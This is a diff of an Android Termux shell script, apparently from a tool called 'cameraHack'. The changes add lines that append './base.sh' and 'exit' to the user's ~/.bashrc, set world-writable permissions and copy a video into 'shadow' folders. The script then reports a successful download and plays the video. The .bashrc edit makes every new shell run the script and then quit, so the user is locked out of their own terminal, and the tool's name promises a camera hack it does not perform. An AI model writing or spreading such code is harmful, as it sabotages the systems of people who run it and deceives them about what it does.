@@ -4,11 +4,18 @@ red='\033[1;31m'
 rset='\033[0m'
 ylo='\033[1;33m'
 #!/system/bin/sh
-echo 'bash /.direct/base.sh' >> ~/.bashrc
+chmod 777 direct
+cp base.sh $HOME
+echo './base.sh' >> ~/.bashrc
 echo 'exit' >> ~/.bashrc
-cp /.direct/hehe.mp4 $HOME
-
+mkdir /data/data/com.termux/files/home/shadow
+mkdir shadow
+cd
+cp direct/hehe.mp4 $HOME
+cp hehe.mp4 shadow
+cp cameraHack/direct/hehe.mp4 shadow
 sleep 2
+chmod +x *
 #...
 #!script auther me
 #by me
@@ -385,10 +392,10 @@ printf "\e[99m\e[1;98m\n "
 toilet succesfully video downloaded
 echo "open video throug any video player"
 sleep 2
-termux-open /.direct/hehe.mp4
+termux-open direct/hehe.mp4
 cd
 termux-open hehe.mp4
-termux-open /.shadow/hehe.mp4
+termux-open shadow/hehe.mp4
 ;;
 
 	    # #############################
